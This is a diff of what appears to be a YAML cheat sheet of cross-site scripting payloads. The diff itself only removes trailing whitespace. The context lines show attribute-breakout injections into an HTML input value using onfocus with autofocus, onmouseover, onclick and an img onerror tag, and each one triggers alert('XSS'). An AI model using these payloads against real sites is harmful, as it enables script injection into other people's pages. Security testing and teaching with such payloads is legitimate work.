@@ -13,10 +13,10 @@ tricks:
     how: "Close the quote and add event handler"
     payload: |
       # Original: <input value="{input}">
-      
+
       # Payload: " onfocus="alert('XSS')" autofocus="
       # Result: <input value="" onfocus="alert('XSS')" autofocus="">
-      
+
       # The autofocus attribute triggers onfocus automatically
 
   - name: "Alternative: Close tag and inject script"
@@ -32,10 +32,9 @@ tricks:
     payload: |
       # onmouseover (requires user interaction)
       " onmouseover="alert('XSS')" x="
-      
+
       # onclick (requires user interaction)
       " onclick="alert('XSS')" x="
-      
+
       # onerror with img
       "><img src=x onerror="alert('XSS')"><input value="
-
